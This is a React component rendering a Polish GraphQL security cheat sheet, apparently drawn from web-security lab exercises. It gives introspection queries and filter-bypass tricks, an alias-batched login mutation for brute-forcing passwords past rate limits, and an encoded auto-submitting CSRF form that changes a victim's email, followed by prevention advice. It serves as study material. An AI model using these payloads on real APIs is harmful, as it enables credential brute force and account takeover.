const GraphQL = () =>{
    return (
        <section>
            <h1>GraphQL</h1>
            <div className="waring">
                Typowe nazwy endpointów
                <ul>
                    <li className="important">/graphql</li>
                    <li className="important">/api</li>
                    <li className="important">/api/graphql</li>
                    <li className="important">/graphql/api</li>
                    <li className="important">/graphql/graphql</li>
                    <p>Jeżeli żaden z endpointów nie odpowiada to można dodać <span className="important">/v1</span></p>
                </ul>
            </div>
            <p>Endpoint głównie odpowiadają na <span className="important">POST</span> z zawartością <span className="important">aplikacja/json</span> oraz <span className="important">GET</span> <span className="important">x-www-form-urlencoded</span></p>

            <details>
                <summary>Discovery schema</summary>
                <div className="waring">
                    <p>{`{`}</p>
                    <p className="tab-1">{`"query": "{__schema{queryType{name}}}"`}</p>
                    <p>{`}`}</p>
                </div>
                <div className="waring">
                    <p>{`query IntrospectionQuery {`}</p>
                    <p className="tab-1">{`__schema {`}</p>
                    <p className="tab-2">{`queryType {`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`mutationType {`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`subscriptionType {`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`types {`}</p>
                    <p className="tab-3">{`...FullType`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`directives {`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-3">{`description`}</p>
                    <p className="tab-3">{`args {`}</p>
                    <p className="tab-4">{`...InputValue`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`onOperation  #Often needs to be deleted to run query`}</p>
                    <p className="tab-2">{`onFragment   #Often needs to be deleted to run query`}</p>
                    <p className="tab-2">{`onField      #Often needs to be deleted to run query`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p>{`}`}</p>

                    <br />

                    <p>{`fragment FullType on __Type {`}</p>
                    <p className="tab-1">{`kind`}</p>
                    <p className="tab-1">{`name`}</p>
                    <p className="tab-1">{`description`}</p>
                    <p className="tab-1">{`fields(includeDeprecated: true) {`}</p>
                    <p className="tab-2">{`name`}</p>
                    <p className="tab-2">{`description`}</p>
                    <p className="tab-2">{`args {`}</p>
                    <p className="tab-3">{`...InputValue`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`type {`}</p>
                    <p className="tab-3">{`...TypeRef`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-2">{`isDeprecated`}</p>
                    <p className="tab-2">{`deprecationReason`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p className="tab-1">{`inputFields {`}</p>
                    <p className="tab-2">{`...InputValue`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p className="tab-1">{`interfaces {`}</p>
                    <p className="tab-2">{`...TypeRef`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p className="tab-1">{`enumValues(includeDeprecated: true) {`}</p>
                    <p className="tab-2">{`name`}</p>
                    <p className="tab-2">{`description`}</p>
                    <p className="tab-2">{`isDeprecated`}</p>
                    <p className="tab-2">{`deprecationReason`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p className="tab-1">{`possibleTypes {`}</p>
                    <p className="tab-2">{`...TypeRef`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p>{`}`}</p>

                    <br />

                    <p>{`fragment InputValue on __InputValue {`}</p>
                    <p className="tab-1">{`name`}</p>
                    <p className="tab-1">{`description`}</p>
                    <p className="tab-1">{`type {`}</p>
                    <p className="tab-2">{`...TypeRef`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p className="tab-1">{`defaultValue`}</p>
                    <p>{`}`}</p>

                    <br />

                    <p>{`fragment TypeRef on __Type {`}</p>
                    <p className="tab-1">{`kind`}</p>
                    <p className="tab-1">{`name`}</p>
                    <p className="tab-1">{`ofType {`}</p>
                    <p className="tab-2">{`kind`}</p>
                    <p className="tab-2">{`name`}</p>
                    <p className="tab-2">{`ofType {`}</p>
                    <p className="tab-3">{`kind`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-3">{`ofType {`}</p>
                    <p className="tab-3">{`kind`}</p>
                    <p className="tab-3">{`name`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`}`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p>{`}`}</p>
                </div>
            </details>

                <hr />

                <details>
                <summary>Omijanie zabezpieczeń introspekcji GraphQL</summary>
                <p>Próbować znaki takie jak <span className="important">spacje, nowe linie i przecinki</span>, ponieważ są one ignorowane przez GraphQL, ale nie przez wadliwe wyrażenie regularne.</p>
                <div className="waring">
                    <p>{`{`}</p>
                    <p className="tab-1">{`"query": "query{__schema`}</p>
                    <p className="tab-1">{`{queryType{name}}}"`}</p>
                    <p>{`}`}</p>
                </div>
                <br />

                <p>Można spróbować również zmiany metody <span className="important">GET/ POST x-www-form-urlencoded</span></p>
                <p><u className="important">URL-encoded !!!!</u></p>
                <p>GET /graphql?query=<span className="important">query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D</span></p>
            </details>

                <hr />

            <details>
                <summary>Bypassing rate limiting</summary>
                <div className="waring">
                    <p>{`{"query":"\n    mutation login(`}<span className="important">{`$input: LoginInput!, $input1: LoginInput!, $input2: LoginInput!, $input3: LoginInput!, $input4: LoginInput!`}</span>{`) {`}</p>
                    <p><span className="important">bruteforce0</span>{`\n  :login(`}<span className="important">input: $input</span>{`) {\n    token\n    success\n  }`} <span className="important">bruteforce1</span>{`\n  :login(`}<span className="important">input: $input1</span>{`) {\n    token\n    success\n  }`} <span className="important">bruteforce2</span>{`\n  :login(`}<span className="important">input: $input2</span>{`) {\n    token\n    success\n  }`} <span className="important">bruteforce3</span>{`\n  :login(`}<span className="important">input: $input3</span>{`) {\n    token\n    success\n  }`} <span className="important">bruteforce4</span>{`\n  :login(`}<span className="important">input: $input4</span>{`) {\n    token\n    success\n  }`} <span className="important">bruteforce5</span>{`\n  :login(`}<span className="important">input: $input5</span>{`) {\n    token\n    success\n  }`}</p>
                    <p>{`,"variables":{"`}<span className="important">input</span>{`":{"username":"carlos","password":"chelsea"},"`}<span className="important">input2</span>{`":{"username":"carlos","password":"biteme"},"`}<span className="important">input3</span>{`":{"username":"carlos","password":"access"},"`}<span className="important">input4</span>{`":{"username":"carlos","password":"yankees"},"`}<span className="important">input5</span>{`":{"username":"carlos","password":"yankees"}}}`}</p>
                </div>
            </details>
            
                <hr />

            <details>
                <summary>CSRF</summary>
                <p>Zapytanie przerobić z POST na GET url-encode</p>
                <p>query=<span className="important">{`%256d%2575%2574%2561%2574%2569%256f%256e%2528%2524%2569%256e%2570%2575%2574%253a%2520%2543%2568%2561%256e%2567%2565%2545
                %256d%2561%2569%256c%2549%256e%2570%2575%2574%2529%2520%257b%250d%250a%2509%2563%2568%2561%256e%2567%2565%2545%256d%2561
                %2569%256c%2528%2569%256e%2570%2575%2574%253a%2520%2524%2569%256e%2570%2575%2574%2529%257b%250d%250a%2509%2509%2565%256d
                %2561%2569%256c%250d%250a%2509%257d%250d%250a%257d&variables=%257b%2522%2569%256e%2570%2575%2574%2522%253a%257b%2522%2565
                %256d%2561%2569%256c%2522%253a%2522%2567%2577%2567%2577%2567%2577%2561%2577%2540%256f%2532%252e%2570%256c%2522%257d%257d`}</span></p>
                <div className="waring">
                    <p>{`<html>`}</p>
                    <p>{`<body>`}</p>
                    <p className="tab-1">{`<form action="https://0adf009803d420d88200938d00db009b.web-security-academy.net/graphql/v1" method="POST">>`}</p>
                    <p className="tab-2">{`<input type="hidden" name="`}<span className="important">query</span>{`" value="`}<span className="important">{`&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;
                    &#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x0a;&#x09;&#x63;&#x68;&#x61;&#x6e;&#x67;
                    &#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x7b;
                    &#x0a;&#x09;&#x09;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x0a;&#x09;&#x7d;&#x0a;&#x7d;`}</span>{`" />`}</p>

                    <p className="tab-1">{`<input type="hidden" name="`}<span className="important">variables</span>{`" value="`}<span className="important">{`&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;
                    &#x22;&#x64;&#x77;&#x61;&#x64;&#x77;&#x61;&#x64;&#x61;&#x77;&#x40;&#x6f;&#x32;&#x2e;&#x70;&#x6c;&#x22;&#x7d;&#x7d;`}</span>{`" />`}</p>
                    <p className="tab-1">{`<script>`}</p>
                    <p className="tab-2">{`document.forms[0].submit();`}</p>
                    <p className="tab-1">{`</script>`}</p>
                    <p>{`</body>`}</p>
                    <p>{`</html>`}</p>
                </div>
            </details>

            <hr />

            <details>
                <summary className="defense">Zapobieganie</summary>
                <ol className="defense">
                    <li>Jeśli Twój interfejs API nie jest przeznaczony do użytku ogółu społeczeństwa, wyłącz w nim introspekcję. Utrudnia to atakującemu uzyskanie informacji o działaniu interfejsu API i zmniejsza ryzyko ujawnienia niepożądanych informacji.</li>
                    <li>Jeśli Twój interfejs API jest przeznaczony do użytku ogółu społeczeństwa, prawdopodobnie będziesz musiał pozostawić włączoną introspekcję. Należy jednak przejrzeć schemat interfejsu API, aby upewnić się, że nie udostępnia on publicznie niezamierzonych pól.</li>
                    <li>Upewnij się, że sugestie są wyłączone. Uniemożliwia to atakującym użycie jasnowidzenia lub podobnych narzędzi w celu uzyskania informacji o podstawowym schemacie.</li>
                    <li>Upewnij się, że schemat interfejsu API nie udostępnia żadnych prywatnych pól użytkowników, takich jak adresy e-mail lub identyfikatory użytkowników.</li>
                </ol>
                <h2 className="defense">Zapobieganie atakom siłowym GraphQL</h2>
                <ol className="defense">
                    <li>Ogranicz głębokość zapytań interfejsu API. Termin „głębokość zapytania” odnosi się do liczby poziomów zagnieżdżenia w zapytaniu. Silnie zagnieżdżone zapytania mogą mieć znaczący wpływ na wydajność i mogą potencjalnie stanowić okazję do ataków DoS, jeśli zostaną zaakceptowane. Ograniczając głębokość zapytań akceptowanych przez Twój interfejs API, możesz zmniejszyć ryzyko wystąpienia takiej sytuacji.</li>
                    <li>Skonfiguruj limity operacji. Limity operacji umożliwiają skonfigurowanie maksymalnej liczby unikalnych pól, aliasów i pól głównych akceptowanych przez interfejs API.</li>
                    <li>Skonfiguruj maksymalną liczbę bajtów, jaką może zawierać zapytanie.</li>
                    <li>Rozważ wdrożenie analizy kosztów w swoim interfejsie API. Analiza kosztów to proces, podczas którego aplikacja biblioteczna identyfikuje koszt zasobów związany z uruchamianiem zapytań w momencie ich otrzymania. Jeśli zapytanie byłoby zbyt skomplikowane obliczeniowo do uruchomienia, interfejs API je porzuca.</li>
                </ol>
                <h2 className="defense">Zapobieganie CSRF przez GraphQL</h2>
                <ol className="defense">
                    <li>Twój interfejs API akceptuje tylko zapytania za pośrednictwem protokołu POST zakodowanego w formacie JSON.</li>
                    <li>Interfejs API sprawdza, czy dostarczona treść jest zgodna z dostarczonym typem zawartości.</li>
                    <li>API posiada bezpieczny mechanizm tokena CSRF.</li>    
                </ol>
            </details>
        </section>
    )
}

export default GraphQL;